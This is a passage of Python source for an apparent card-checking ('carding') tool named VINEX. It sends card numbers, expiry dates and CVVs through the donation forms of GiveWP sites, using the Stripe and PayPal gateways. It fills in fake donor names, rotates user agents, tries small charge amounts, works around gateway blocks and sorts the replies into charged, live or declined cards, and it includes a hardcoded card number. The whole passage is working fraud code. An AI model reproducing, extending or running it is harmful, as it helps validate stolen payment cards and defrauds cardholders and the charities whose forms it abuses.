                    'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
                    'give-gateway': payment_mode, 'give_agree_to_terms': 'on', 'give_terms_agreement': 'on',
                }
                if pid is not None: fd['give-price-id'] = pid
                fd = self._autofill_required_fields(fd)
                da4 = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
                he5 = {'content-type': da4.content_type, 'user-agent': self.uu.random,
                       'x-requested-with': 'XMLHttpRequest', 'referer': self.page_url, 'origin': f'https://{self.url}'}
                r5 = self.r.post(self.ajax_url, params={'action': 'give_paypal_commerce_approve_order', 'order': order_id}, headers=he5, data=da4, timeout=20)
                text = (r5.text or ''); combined = text + confirm_body; lower = combined.lower()
                if '"success":true' in lower and '"error"' not in lower: return f'CHARGE {amt}$', combined
                if is_card_decline(combined):
                    return (extract_response_text(text) or extract_response_text(confirm_body) or combined[:300]), combined
                if is_auth_failure(combined): return 'AUTH_FAILURE_ON_APPROVE', combined
                raw = extract_response_text(text) or extract_response_text(confirm_body)
                if raw and raw.strip(): return raw, combined
                if confirm_body.strip(): return extract_response_text(confirm_body), confirm_body
                return 'APPROVE_NO_RESPONSE', ''
            except Exception as e:
                return None, f'APPROVE_EXC_{type(e).__name__}'
        except Exception as e:
            return None, f'FATAL_{type(e).__name__}'

    def _attempt_stripe_charge(self, n, mm, yy, cvc, amt, pid=None, payment_mode='stripe'):
        try:
            self._current_gateway_name = 'stripe'
            if not self.stripe_pk: return None, 'STRIPE_SKIP_NO_PK'
            if self.stripe_blocked: return None, 'STRIPE_BLOCKED_SKIP'
            # Try site AJAX (bypass block)
            site_result, site_text = self._stripe_via_site_ajax(n, mm, yy, cvc, amt, pid=pid)
            if site_result: return site_result, site_text
            # Direct Stripe
            browser_headers = self._get_browser_headers({'Content-Type': 'application/x-www-form-urlencoded', 'Stripe-Version': '2023-10-16', 'Sec-Fetch-Site': 'cross-site'})
            pm = None; token = None
            try:
                r = self.r.post('https://api.stripe.com/v1/payment_methods', auth=(self.stripe_pk, ''), headers=browser_headers,
                    data={'type': 'card', 'card[number]': n, 'card[exp_month]': str(mm), 'card[exp_year]': str(yy), 'card[cvc]': str(cvc)}, timeout=20)
                if r.status_code == 200:
                    try: pm = r.json().get('id')
                    except: pass
                else:
                    err_body = (r.text or '').lower()
                    if 'unsupported' in err_body or 'integration surface' in err_body:
                        self.stripe_blocked = True; return None, 'STRIPE_BLOCKED'
                    try:
                        err = r.json().get('error', {}); msg = err.get('message', 'FAIL'); code = err.get('code', '')
                        if code in ('card_declined','expired_card','insufficient_funds','incorrect_number','incorrect_cvc'):
                            return f'{msg} ({code})', r.text
                        if 'expired' in msg.lower(): return 'Your card has expired', r.text
                    except: pass
            except Exception as e: pass
            if not pm:
                try:
                    r2 = self.r.post('https://api.stripe.com/v1/tokens', auth=(self.stripe_pk, ''), headers=browser_headers,
                        data={'card[number]': n, 'card[exp_month]': str(mm), 'card[exp_year]': str(yy), 'card[cvc]': str(cvc)}, timeout=20)
                    if r2.status_code == 200:
                        try: token = r2.json().get('id')
                        except: pass
                except: pass
            if not pm and not token:
                return None, site_text or 'STRIPE_NO_TOKEN'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': payment_mode, 'give_first': random.choice(FIRST_NAMES),
                'give_last': random.choice(LAST_NAMES), 'give_email': self.email,
                'give-gateway': payment_mode, 'give_agree_to_terms': 'on',
            }
            if token: fd['stripe_token'] = token; fd['give_stripe_token'] = token
            if pm: fd['give_stripe_payment_method'] = pm; fd['payment_method_id'] = pm
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            for action in ['give_process_donation','give_stripe_process_payment_intent','give_stripe_javascript_payment_intent']:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                    body = r.text or ''
                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                    real = extract_response_text(body)
                    if real and is_card_decline(real): return real, body
                    if real and 'not enabled' not in real.lower() and 'unknown action' not in real.lower(): return real, body
                except: continue
            return None, 'STRIPE_NO_RESPONSE'
        except Exception as e:
            return None, f'STRIPE_EXC_{type(e).__name__}'

    def _stripe_create_pm_via_site(self, n, mm, yy, cvc):
        if not self.ajax_url or not self.id_form2: return None, 'NO_AJAX'
        actions = ['give_stripe_create_payment_method','give_stripe_get_payment_method','give_stripe_create_setup_intent','give_stripe_create_payment_intent','give_create_payment_method']
        full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
        for action in actions:
            payloads = [
                {'action': action, 'form_id': self.id_form2, 'give-form-id': self.id_form2,
                 'give-form-hash': self.nonce or '', 'card_number': n, 'card_cvc': cvc,
                 'card_expiry': f'{mm}/{yy}', 'card_exp_month': mm, 'card_exp_year': f'20{yy}',
                 'card_name': full_name, 'billing_name': full_name, 'billing_zip': '10001'},
                {'action': action, 'form_id': self.id_form2},
            ]
            for payload in payloads:
                try:
                    r = self._safe_post(self.ajax_url, data=payload, headers=self._get_browser_headers(), timeout=10)
                    if not r or r.status_code != 200: continue
                    body = r.text or ''
                    try:
                        j = r.json()
                        if isinstance(j, dict):
                            data = j.get('data', {})
                            if isinstance(data, dict):
                                for key in ('payment_method','pm','payment_method_id'):
                                    pm = data.get(key)
                                    if pm and str(pm).startswith('pm_'): return pm, None
                            elif isinstance(data, str) and data.startswith('pm_'):
                                return data, None
                    except: pass
                    m = re.search(r'pm_[A-Za-z0-9]{20,}', body)
                    if m: return m.group(0), None
                except: continue
        return None, 'NO_PROXY'

    def _stripe_via_site_ajax(self, n, mm, yy, cvc, amt, pid=None):
        if not self.ajax_url or not self.id_form2: return None, 'NO_AJAX'
        expiry_slash = f'{mm}/{yy}'
        full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
        base_fd = {
            'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
            'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
            'payment-mode': 'stripe', 'give-gateway': 'stripe',
            'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
            'give_email': self.email, 'give_agree_to_terms': 'on',
        }
        if pid is not None: base_fd['give-price-id'] = pid
        base_fd = self._autofill_required_fields(base_fd)
        base_fd = self._autofill_card_fields(base_fd, n, mm, yy, cvc)
        card_fields = {
            'card_number': n, 'cardNumber': n, 'card_cvc': cvc, 'cardCVC': cvc,
            'cvc': cvc, 'cvv': cvc, 'cvv2': cvc, 'csc': cvc,
            'card_expiry': expiry_slash, 'cardExpiry': expiry_slash, 'card_exp': expiry_slash,
            'exp_month': mm, 'exp_year': f'20{yy}',
            'card_name': full_name, 'card_holder': full_name,
            'card_zip': '10001', 'billing_zip': '10001',
        }
        pm_token, _ = self._stripe_create_pm_via_site(n, mm, yy, cvc)
        actions = ['give_stripe_create_payment_intent','give_stripe_process_payment_intent','give_stripe_javascript_payment_intent','give_process_donation','give_stripe_confirm_payment_intent']
        for action in actions:
            v1 = dict(base_fd); v1.update(card_fields)
            if pm_token: v1['payment_method'] = pm_token; v1['payment_method_id'] = pm_token
            try:
                da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in v1.items()})
                headers = self._get_browser_headers({'Content-Type': da.content_type})
                r = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=da, timeout=20)
                body = r.text or ''
                if r.status_code != 200: continue
                if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                real = extract_response_text(body)
                if real and is_card_decline(real): return real, body
                if 'not enabled' in body.lower() or 'unknown action' in body.lower(): continue
                if real and any(k in real.lower() for k in ('card','declined','expired','insufficient','cvc','reject')): return real, body
            except: continue
        return None, 'SITE_AJAX_FAILED'

    def _attempt_paypal_payflow(self, n, mm, yy, cvc, amt, pid=None, mode='paypalpro_payflow'):
        try:
            self._current_gateway_name = 'paypal_payflow'
            expiry = f'{mm}{yy}'
            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': mode, 'give-gateway': mode,
                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                'give_email': self.email, 'give_agree_to_terms': 'on',
                'card_number': n, 'card_cvc': cvc, 'card_expiry': expiry,
                'card_exp_month': mm, 'card_exp_year': yy, 'card_name': full_name,
                'card_address': '123 Main St', 'card_city': 'New York',
                'card_state': 'NY', 'card_zip': '10001', 'card_country': 'US',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            for action in ['give_paypal_pro_payflow_purchase','give_payflow_purchase','give_paypal_payflow_purchase','give_process_donation']:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                    body = r.text or ''
                    if r.status_code != 200: continue
                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                    real = extract_response_text(body)
                    if real and is_card_decline(real): return real, body
                    if 'unknown action' in body.lower() or 'not enabled' in body.lower(): continue
                    if real: return real, body
                except: continue
            return None, 'PAYFLOW_FAILED'
        except: return None, 'PAYFLOW_EXC'

    def _attempt_paypal_pro(self, n, mm, yy, cvc, amt, pid=None, mode='paypalpro'):
        try:
            self._current_gateway_name = 'paypal_pro'
            expiry = f'{mm}{yy}'
            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': mode, 'give-gateway': mode,
                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                'give_email': self.email, 'give_agree_to_terms': 'on',
                'card_number': n, 'card_cvc': cvc, 'card_expiry': expiry,
                'card_exp_month': mm, 'card_exp_year': yy, 'card_name': full_name,
                'billing_first_name': random.choice(FIRST_NAMES), 'billing_last_name': random.choice(LAST_NAMES),
                'billing_email': self.email, 'billing_address_1': '123 Main St',
                'billing_city': 'New York', 'billing_state': 'NY', 'billing_zip': '10001', 'billing_country': 'US',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            for action in ['give_paypal_pro_purchase','give_paypal_pro_process','give_process_donation']:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                    body = r.text or ''
                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                    real = extract_response_text(body)
                    if real and is_card_decline(real): return real, body
                    if 'unknown action' in body.lower(): continue
                    if real: return real, body
                except: continue
            return None, 'PP_PRO_FAILED'
        except: return None, 'PP_PRO_EXC'

    def _attempt_paypal_standard(self, n, mm, yy, cvc, amt, pid=None, mode='paypal'):
        try:
            self._current_gateway_name = 'paypal_standard'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': mode, 'give-gateway': mode,
                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                'give_email': self.email, 'give_agree_to_terms': 'on',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            for action in ['give_paypal_standard_purchase','give_paypal_standard_process','give_process_donation']:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                    body = r.text or ''
                    if '"success":true' in body.lower() and '"error"' not in body.lower():
                        m = re.search(r'https?://(?:www\.)?paypal\.com[^"\'\s]+', body)
                        if m: return 'PAYPAL_STANDARD: Redirect required', body
                        return 'PAYPAL_STANDARD: Order created', body
                    real = extract_response_text(body)
                    if real and is_card_decline(real): return real, body
                except: continue
            return None, 'PAYPAL_STANDARD_FAILED'
        except: return None, 'PP_STD_EXC'

    def _attempt_generic_dispatch(self, n, mm, yy, cvc, amt, pid=None, mode='paypal-commerce'):
        try:
            self._current_gateway_name = f'generic_{mode}'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': mode, 'give-gateway': mode,
                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                'give_email': self.email, 'give_agree_to_terms': 'on',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            try:
                r = self.r.post(self.ajax_url, params={'action': 'give_process_donation'}, headers=he, data=da, timeout=25)
                body = r.text or ''
                if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                real = extract_response_text(body)
                if real and is_card_decline(real): return real, body
                if 'not enabled' in body.lower(): return None, f'GATEWAY_NOT_ENABLED: {mode}'
                if real: return real, body
                return None, f'DISPATCH_NO_RESPONSE: {mode}'
            except: return None, 'DISPATCH_EXC'
        except: return None, 'DISPATCH_FATAL'

    def _attempt_raw_card(self, n, mm, yy, cvc, amt, pid=None, mode='credit-card'):
        try:
            self._current_gateway_name = f'raw_card_{mode}'
            expiry_slash = f'{mm}/{yy}'
            full_name = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
            fd = {
                'give-form-id-prefix': self.id_form1 or '', 'give-form-id': self.id_form2 or '',
                'give-form-hash': self.nonce or '', 'give-amount': amt, 'give-currency': self.currency,
                'payment-mode': mode, 'give-gateway': mode,
                'give_first': random.choice(FIRST_NAMES), 'give_last': random.choice(LAST_NAMES),
                'give_email': self.email, 'give_agree_to_terms': 'on',
                'card_number': n, 'cardNumber': n, 'card_cvc': cvc, 'cardCVC': cvc,
                'cvc': cvc, 'cvv': cvc, 'cvv2': cvc, 'csc': cvc,
                'card_expiry': expiry_slash, 'cardExpiry': expiry_slash,
                'card_exp': expiry_slash, 'expiry': expiry_slash,
                'exp_month': mm, 'exp_year': f'20{yy}',
                'card_name': full_name, 'cardholder_name': full_name,
                'card_zip': '10001', 'card_postal': '10001',
                'card_address': '123 Main St', 'card_city': 'New York',
                'card_state': 'NY', 'card_country': 'US',
            }
            if pid is not None: fd['give-price-id'] = pid
            fd = self._autofill_required_fields(fd)
            fd = self._autofill_card_fields(fd, n, mm, yy, cvc)
            da = MultipartEncoder({k: (None, str(v) if v is not None else '') for k, v in fd.items()})
            he = self._get_browser_headers({'Content-Type': da.content_type})
            for action in ['give_process_donation','give_process_cc_donation','give_cc_process_donation']:
                try:
                    r = self.r.post(self.ajax_url, params={'action': action}, headers=he, data=da, timeout=20)
                    body = r.text or ''
                    if r.status_code != 200: continue
                    if '"success":true' in body.lower() and '"error"' not in body.lower(): return f'CHARGE {amt}$', body
                    real = extract_response_text(body)
                    if real and is_card_decline(real): return real, body
                    if 'not enabled' in body.lower(): continue
                    if real: return real, body
                except: continue
            return None, 'RAW_ALL_FAILED'
        except: return None, 'RAW_FATAL'

    def Charge(self, ccx, thorough=False):
        try:
            if not ccx or not isinstance(ccx, str): return 'INVALID_CARD_FORMAT'
            parts = re.split(r'[|:/]', ccx.strip().replace(' ', ''))
            if len(parts) < 4: return 'INVALID_CARD_FORMAT'
            n = re.sub(r'\D', '', parts[0])
            mm = re.sub(r'\D', '', parts[1]).zfill(2)
            yy = re.sub(r'\D', '', parts[2])
            cvc = re.sub(r'\D', '', parts[3])
            if len(yy) == 4 and yy.startswith('20'): yy = yy[2:]
            yy = yy.zfill(2)
            if len(n) < 13 or len(n) > 19: return 'INVALID_CARD_NUMBER'
            if len(mm) != 2 or not (1 <= int(mm) <= 12): return 'INVALID_EXPIRY_MONTH'
            if len(cvc) < 3 or len(cvc) > 4: return 'INVALID_CVV'
            if not self.ajax_url or 'invalid.local' in self.ajax_url: return 'INVALID_SITE'
            if not self.id_form2:
                fid = self._find_form_id_comprehensive()
                if fid: self.id_form2 = fid; self.id_form1 = f'{fid}-1'
                else:
                    if not self.is_givewp: return 'NOT_GIVEWP: Site does not use GiveWP'
                    return 'FORM_ERROR: form-id missing (GiveWP detected)'
            if not self.nonce:
                self._try_ajax_nonce()
                if not self.nonce: self._refresh_nonce()
                if not self.nonce: return 'NONCE_MISSING'
            if not self.id_form1: self.id_form1 = f'{self.id_form2}-1'
            if not self.au:
                self._extract_tokens_ultimate()
                if not self._pick_valid_token():
                    if self._try_ajax_client_token(): self._pick_valid_token()

            # Build attempts
            attempts_gw = []; seen = set()
            def add(gw, mode):
                k = (gw, mode)
                if k not in seen: seen.add(k); attempts_gw.append(k)

            if self.actual_payment_mode:
                m = self.actual_payment_mode; ml = m.lower()
                if 'payflow' in ml: add('paypal_payflow', m)
                elif 'paypalpro' in ml: add('paypal_pro', m)
                elif 'commerce' in ml: add('paypal_commerce', m)
                elif 'braintree' in ml: add('generic_dispatch', m)
                elif ml == 'paypal': add('paypal_standard', m)
                elif 'stripe' in ml and self.has_stripe: add('stripe', m)
                elif any(k in ml for k in ('credit','card','cc')): add('raw_card', m)
                else: add('generic_dispatch', m)
            for mode in self.paypal_modes:
                ml = mode.lower()
                if 'payflow' in ml: add('paypal_payflow', mode)
                elif 'paypalpro' in ml: add('paypal_pro', mode)
                elif 'commerce' in ml: add('paypal_commerce', mode)
                elif 'braintree' in ml: add('generic_dispatch', mode)
                elif ml == 'paypal': add('paypal_standard', mode)
            if self.has_stripe and self.stripe_pk: add('stripe', 'stripe')
            if self.has_paypal_commerce: add('paypal_commerce', 'paypal-commerce')
            for mode in self.all_card_modes:
                ml = mode.lower()
                if 'stripe' in ml and self.has_stripe: add('stripe', mode)
                elif any(k in ml for k in ('credit','card','cc')): add('raw_card', mode)
            if self.has_card_fields: add('raw_card', 'credit-card')
            if not attempts_gw:
                add('paypal_commerce', 'paypal-commerce')
                add('generic_dispatch', 'paypal')
                add('raw_card', 'credit-card')

            # Pairs
            pairs = []
            if self.price_levels:
                for pid, amt in sorted(self.price_levels, key=lambda x: x[1]):
                    pairs.append((pid, f'{amt:.2f}'))
            base_amts = set(a for _, a in pairs)
            for amt in BASE_AMOUNTS:
                if amt not in base_amts: pairs.append(('custom', amt))
            pairs = sorted(pairs, key=lambda x: float(x[1]))

            all_results = []; create_errors = []
            auth_retry_done = False; real_decline = None

            for gw_type, gw_mode in attempts_gw:
                if gw_type == 'stripe' and not self.stripe_pk: continue
                if gw_type == 'paypal_commerce' and not self.au:
                    self._extract_tokens_ultimate()
                    if not self._pick_valid_token():
                        if self._try_ajax_client_token(): self._pick_valid_token()
                for pid, amt in pairs:
                    try:
                        if gw_type == 'stripe':
                            result, text = self._attempt_stripe_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                        elif gw_type == 'raw_card':
                            result, text = self._attempt_raw_card(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                        elif gw_type == 'paypal_payflow':
                            result, text = self._attempt_paypal_payflow(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                        elif gw_type == 'paypal_pro':
                            result, text = self._attempt_paypal_pro(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                        elif gw_type == 'paypal_standard':
                            result, text = self._attempt_paypal_standard(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                        elif gw_type == 'generic_dispatch':
                            result, text = self._attempt_generic_dispatch(n, mm, yy, cvc, amt, pid=pid, mode=gw_mode)
                        else:
                            result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                        if result and result.startswith('AUTH_FAILURE'):
                            if not auth_retry_done:
                                auth_retry_done = True
                                self.token_candidates = []; self.au = None
                                self._refresh_nonce(); self._extract_tokens_ultimate()
                                if self._pick_valid_token():
                                    if gw_type == 'paypal_commerce':
                                        result, text = self._attempt_charge(n, mm, yy, cvc, amt, pid=pid, payment_mode=gw_mode)
                                        if result and not result.startswith('AUTH_FAILURE'):
                                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type, 'response_gateway': self._current_gateway_name or gw_type})
                                            continue
                            create_errors.append((amt, 'AUTH_REFRESH'))
                        elif result:
                            all_results.append({'amount': amt, 'result': result, 'text': text, 'pid': pid, 'gateway': gw_type, 'response_gateway': self._current_gateway_name or gw_type})
                            if is_card_decline(result) and not real_decline:
                                real_decline = result
                        elif not result:
                            create_errors.append((amt, text or 'unknown'))
                    except Exception as e:
                        create_errors.append((amt, f'EXC_{type(e).__name__}'))
                if real_decline: break

            if all_results:
                best = max(all_results, key=lambda x: score_result(x['result']))
                self.donation = best['amount']
                self.response_gateway = best.get('response_gateway') or best.get('gateway') or self.gateway_type
                return normalize_result(best['result'])
            if create_errors:
                last_amt, last_err = create_errors[-1]
                self.donation = last_amt
                return last_err if last_err else 'ORDER_CREATE_FAILED'
            return 'NO_ATTEMPT'
        except Exception as e:
            return f'FATAL_{type(e).__name__}: {str(e)[:100]}'

# ═══════════ BRIDGE ═══════════
def check_single_link(link, thorough=True):
    try:
        link = safe_url(link)
        if not link:
            return {'link': str(link)[:100] if link else 'Invalid', 'live': False, 'respons': 'BAD_URL', 'amount': '1.00', 'tester': None}
        tester = VinexTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False, 'respons': 'FETCH_FAILED', 'amount': '1.00', 'tester': tester}
        result = tester.Charge(TEST_CARD, thorough=thorough)
        live = is_live_response(result) and not is_dead_response(result)
        return {'link': link[:100], 'live': live, 'respons': str(result)[:300], 'amount': tester.donation,
                'minimum': tester.minimum, 'currency': tester.currency, 'auth': tester.auth_method, 'tester': tester}
    except:
        return {'link': str(link)[:100] if link else 'Invalid', 'live': False, 'respons': 'FATAL', 'amount': '1.00', 'tester': None}

# ═══════════ GATEWAY TEMPLATE ═══════════
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# VINEX Gateway v23.1
import requests, random, time, re, base64, json, os, sys
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0'
except:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL="$page_url"; AJAX_URL="$ajax_url"; ID_FORM1="$id_form1"; ID_FORM2="$id_form2"
NONCE="$nonce"; ACCESS_TOKEN="$access_token"; PAYPAL_META="$paypal_meta"; CLIENT_ID="$client_id"
STRIPE_PK="$stripe_pk"; CURRENCY="$currency"; MINIMUM="$minimum"; CURRENT_PID="$current_pid"
PRICE_LEVELS=$price_levels_json; FORM_FIELDS=$form_fields_json
HOST=PAGE_URL.split('//')[-1].split('/')[0]
FIRST_NAMES=['James','John','Robert','Michael']; LAST_NAMES=['Smith','Johnson','Williams','Brown']
BASE_AMOUNTS=['1.00','3.00','5.00']
TEST_CARD='4232231186004159|01|29|903'

def extract_response_text(b):
    if not b: return ''
    s = str(b).strip()
    if not s: return ''
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            d = j.get('data')
            if isinstance(d, dict):
                det = d.get('details')
                if isinstance(det, list) and det:
                    for x in det:
                        if isinstance(x, dict):
                            for k in ('description','issue','reason','message'):
                                v = x.get(k)
                                if v and str(v).strip().lower() not in ('none','null',''): return str(v)[:500]
                for k in ('error','message','msg','reason','detail','description','name','code'):
                    v = d.get(k)
                    if v and str(v).strip().lower() not in ('none','null','false',''): return str(v)[:500]
            elif isinstance(d, str) and d.strip(): return d[:500]
            for k in ('error','message','msg','detail','reason','description','code'):
                v = j.get(k)
                if v and str(v).strip().lower() not in ('none','null','','false'): return str(v)[:500]
    except: pass
    return s[:500]

_JUNK=['give-','screen-reader','give-label','give-required','give-where']
_JUNK_E={'true','false','none','null','selected','disabled','required'}
def is_valid_option(o):
    if not o or not isinstance(o, str): return False
    x = o.strip()
    if not x: return False
    l = x.lower()
    if l in _JUNK_E: return False
    for p in _JUNK:
        if p in l: return False
    if len(x) > 60 or x.startswith(('{','[','<')): return False
    return True

CARD_DECLINES = ['INSTRUMENT_DECLINED','PAYER_CANNOT_PAY','ORDER_NOT_APPROVED','Payer has not yet approved','Payer cannot pay','PAYMENT_DENIED','DO_NOT_HONOR','INSUFFICIENT_FUNDS','CVV_FAILURE','CVV2_FAILURE','INVALID_OR_RESTRICTED','SUSPECTED_FRAUD','ACCOUNT_CLOSED','EXPIRED_CARD','CARD_EXPIRED','TRANSACTION_NOT_PERMITTED','GENERIC_DECLINE','TRANSACTION_REFUSED','AUTHORIZATION_DENIED','DECLINED','Your card has expired','Your card was declined','card_expired','expired_card','card_declined','incorrect_number','incorrect_cvc','invalid_number','invalid_expiry_month','invalid_expiry_year','invalid_cvc','processing_error','fraudulent','lost_card','pickup_card','restricted_card','REJECT64','REJECT_64','reject64','insufficient_funds','declined_by_issuer','transaction_declined','payment_declined','REJECTED','DECLINED','DENIED','REFUSED','EXPIRED']
def is_card_decline(t):
    if not t: return False
    s = str(t); up = s.upper()
    for p in CARD_DECLINES:
        if p.upper() in up: return True
    for sep in (':','=','|',';','/'):
        if sep in s:
            for part in s.split(sep):
                pc = part.strip().upper()
                if not pc: continue
                for p in CARD_DECLINES:
                    if p.upper() == pc: return True
                    if len(p) > 5 and p.upper() in pc: return True
    m = re.search(r'(?:reject|error|code|decline)[\s_\-]*(\d{1,3})[\s:=_\-]+(.{3,100})', s, re.I)
    if m:
        reason = m.group(2).upper()
        for sig in ('REJECT','DECLINE','DENIED','REFUSED','INSUFFICIENT','EXPIRED','INVALID','FRAUD','BLOCKED'):
            if sig in reason: return True
    return False

def luhn_check(cn):
    try:
        d = [int(x) for x in str(cn)]; o = d[-1::-2]; e = d[-2::-2]
        t = sum(o)
        for x in e: t += sum([int(y) for y in str(x*2)])
        return t % 10 == 0
    except: return False

class PayPal:
    def __init__(self):
        self.email = "%s%s%d@gmail.com" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES), random.randint(100,999))
        self.r = requests.Session(); self.r.headers.update({'user-agent':rand_ua()})
        self.donation = "1.00"
        try:
            self.r.get('https://%s/' % HOST, timeout=15); time.sleep(0.2); self.r.get(PAGE_URL, timeout=20)
        except: pass
    def _autofill(self, fd):
        for name, info in FORM_FIELDS.items():
            if name in fd or not info.get("required") or name.startswith(("give-form-","give_")): continue
            if "prefill" in info: fd[name] = info["prefill"]; continue
            ft = info.get("type","")
            opts = [o for o in info.get("options",[]) if is_valid_option(o)]
            if ft in ("select","radio"):
                if not opts: continue
                fd[name] = opts[0]
            elif ft == "email": fd[name] = self.email
            else: fd[name] = "1234567890" if ft == "tel" else "Test"
        return fd
    def _create(self, amt, pid, mode='paypal-commerce'):
        try:
            fd = {"give-form-id-prefix":ID_FORM1,"give-form-id":ID_FORM2,"give-form-hash":NONCE,"give-amount":amt,"give-currency":CURRENCY,"payment-mode":mode,"give-gateway":mode,"give_first":random.choice(FIRST_NAMES),"give_last":random.choice(LAST_NAMES),"give_email":self.email,"give_agree_to_terms":"on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k:(None,str(v)) for k,v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action":"give_paypal_commerce_create_order"}, headers={"content-type":da.content_type,"x-requested-with":"XMLHttpRequest","referer":PAGE_URL,"origin":"https://"+HOST}, data=da, timeout=20)
            body = r.text or ''
            try: j = r.json()
            except: return None, "JSON_ERR: "+body[:200]
            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict) and j["data"].get("id"): return j["data"]["id"], None
            return None, extract_response_text(body) or "CREATE_FAILED"
        except Exception as e: return None, "EXC_%s" % type(e).__name__
    def _confirm(self, oid, n, mm, yy, cvc):
        try:
            he = {"authorization":"Bearer "+(ACCESS_TOKEN or ""),"paypal-client-metadata-id":PAYPAL_META or CLIENT_ID or "","content-type":"application/json","origin":"https://"+HOST,"referer":PAGE_URL}
            expiry = "20%s-%s" % (yy,mm)
            da = {"payment_source":{"card":{"number":n,"expiry":expiry,"security_code":cvc,"attributes":{"verification":{"method":"SCA_WHEN_REQUIRED"}}}},"application_context":{"vault":False}}
            cr = self.r.post("https://cors.api.paypal.com/v2/checkout/orders/"+oid+"/confirm-payment-source", headers=he, json=da, timeout=20)
            return cr.text or ""
        except: return ""
    def _approve(self, oid, amt, pid, mode='paypal-commerce'):
        try:
